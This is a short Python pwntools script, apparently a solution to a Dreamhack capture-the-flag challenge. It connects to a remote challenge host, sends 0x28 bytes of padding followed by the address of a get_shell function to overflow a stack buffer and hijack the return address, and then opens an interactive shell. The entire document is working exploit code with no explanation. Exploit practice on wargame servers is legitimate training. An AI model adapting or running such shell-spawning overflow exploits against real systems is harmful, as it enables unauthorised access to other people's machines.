from pwn import *

p=remote("host3.dreamhack.games",20701)

get_shell=0x804867b
payload=b"A"*0x28+p32(get_shell)

p.sendline(payload)

p.interactive()